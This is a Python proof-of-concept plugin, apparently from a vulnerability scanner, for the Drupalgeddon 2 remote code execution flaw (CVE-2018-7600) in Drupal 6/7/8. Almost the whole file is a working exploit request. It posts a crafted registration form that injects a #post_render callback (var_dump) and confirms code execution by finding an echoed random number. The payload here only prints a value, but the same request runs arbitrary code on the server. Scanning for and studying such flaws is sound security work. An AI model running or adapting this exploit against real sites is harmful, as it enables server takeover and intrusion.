#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import random
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Drupal Drupalgeddon 2 远程代码执行漏洞",
        "desc": "6/7/8版本的Form API中存在一处远程代码执行漏洞，可导致服务器直接被入侵控制。",
        "grade": "中",
        "type": "web",
        "keyword": "tag:Drupal cve:CVE-2018-7600"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    rand_str = str(random.randint(200000000, 210000000))
    try:
        r = requests.post(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            data=f"form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=var_dump&mail[#type]=markup&mail[#markup]={rand_str}",
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and f"string(4) \"{rand_str}\"" in r.text:
            return True
        else:
            return False
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

